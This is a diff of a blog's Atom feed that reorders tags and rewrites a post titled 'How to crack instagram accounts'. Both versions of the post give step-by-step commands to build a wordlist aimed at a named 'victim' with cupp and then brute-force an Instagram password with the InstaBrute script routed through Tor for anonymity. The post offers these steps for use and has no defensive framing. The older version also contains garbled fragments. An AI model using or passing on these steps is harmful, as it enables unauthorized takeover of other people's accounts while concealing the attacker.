@@ -38,9 +38,9 @@
       <category term="Code" scheme="http://yoursite.com/categories/Code/"/>
     
     
-      <category term="NodeJS" scheme="http://yoursite.com/tags/NodeJS/"/>
-    
       <category term="Hacking" scheme="http://yoursite.com/tags/Hacking/"/>
+    
+      <category term="NodeJS" scheme="http://yoursite.com/tags/NodeJS/"/>
     
       <category term="Puppeteer" scheme="http://yoursite.com/tags/Puppeteer/"/>
     
@@ -434,9 +434,9 @@
     <link href="http://yoursite.com/2018/08/17/Cracking-Instagram-Accounts/"/>
     <id>http://yoursite.com/2018/08/17/Cracking-Instagram-Accounts/</id>
     <published>2018-08-17T09:12:31.000Z</published>
-    <updated>2019-01-12T16:28:30.831Z</updated>
+    <updated>2019-01-12T16:35:30.238Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="How-to-crack-instagram-accounts"><a href="#How-to-crack-instagram-accounts" class="headerlink" title="How to crack instagram accounts"></a><strong>How to crack instagram accounts</strong></h2><p><strong>First we will want to generate dictionary to target our victim,</strong></p><p><strong>We will do this by getting cupp:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">cd cupp</span><br><span class="line"></span><br><span class="line">python cupp.py -i</span><br></pre></td></tr></table></figure><p>Aft</p><p>cd cupp</p><p>python cupp.py -i</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">![](/images/crackinsta1.png)</span><br><span class="line"></span><br><span class="line">After Generating the word-lst we would like to use it.</span><br></pre></td></tr></table></figure><p>aapt-get install tor</p><p>git clone <a href="https://github.com/Ha3MrX/InstaBrute" target="_blank" rel="noopener">https://github.com/Ha3MrX/InstaBrute</a></p><p>cd InstaBrute</p><p>chmod +x insta.sh</p><p>./insta.sh<br><code>`</code></p><p><img src="/images/crackinsta2.png" alt=""></p><p>Now that will run from different tor-routers to gain anonymity and when we will retrieve the password it will automatically stop.</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="How-to-crack-instagram-accounts"><a href="#How-to-crack-instagram-accounts" class="headerlink" title="How to crack instagram accounts"></a><strong>How to crack instagram accounts</strong></h2><p><strong>First we will want to generate dictionary to target our victim,</strong></p><p><strong>We will do this by getting cupp:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Mebus/cupp</span><br><span class="line"></span><br><span class="line">cd cupp</span><br><span class="line"></span><br><span class="line">python cupp.py -i</span><br></pre></td></tr></table></figure><p><img src="/images/crackinsta1.png" alt=""></p><p>After Generating the word-lst we would like to use it.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tor</span><br><span class="line"></span><br><span class="line">git clone https://github.com/Ha3MrX/InstaBrute</span><br><span class="line"></span><br><span class="line">cd InstaBrute</span><br><span class="line"></span><br><span class="line">chmod +x insta.sh</span><br><span class="line"></span><br><span class="line">./insta.sh</span><br></pre></td></tr></table></figure><p><img src="/images/crackinsta2.png" alt=""></p><p>Now that will run from different tor-routers to gain anonymity and when we will retrieve the password it will automatically stop.</p>]]></content>
     
     <summary type="html">
     
